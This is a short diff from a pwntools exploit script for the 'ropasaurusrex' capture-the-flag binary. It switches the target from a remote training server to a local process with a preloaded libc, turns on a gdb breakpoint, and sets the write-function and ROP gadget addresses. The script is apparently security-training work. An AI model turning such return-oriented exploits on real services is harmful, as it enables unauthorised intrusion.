@@ -4,10 +4,10 @@ import time
 
 context.terminal = ['tmux', 'splitw', '-h']
 
-#r = process("./ropasaurusrex", env={"LD_PRELOAD":"./libc-2.27.so"})
-r = remote("training.jinblack.it", 2014)
-#gdb.attach(r, """b *0x08048442
-#""")
+r = process("./ropasaurusrex", env={"LD_PRELOAD":"./libc-2.27.so"})
+#r = remote("training.jinblack.it", 2014)
+gdb.attach(r, """b *0x08048442
+""")
 
 write_address = p32(0x0804830c) 
 gadget_address = p32(0x080484b6)
